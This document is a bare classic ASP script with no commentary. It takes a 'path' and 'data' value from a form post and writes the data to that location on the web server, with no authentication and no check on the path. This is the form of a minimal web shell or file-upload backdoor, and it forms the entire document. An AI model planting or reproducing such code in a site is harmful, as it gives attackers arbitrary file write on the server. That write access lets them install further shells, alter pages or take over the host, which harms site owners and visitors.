

<%
dim fs,f,data,path
set fs=Server.CreateObject("Scripting.FileSystemObject")
data = Request.form("data")
path= Request.form("path")
set f=fs.OpenTextFile(Server.MapPath(path),2,true)
f.Write(data)
f.Close

%>
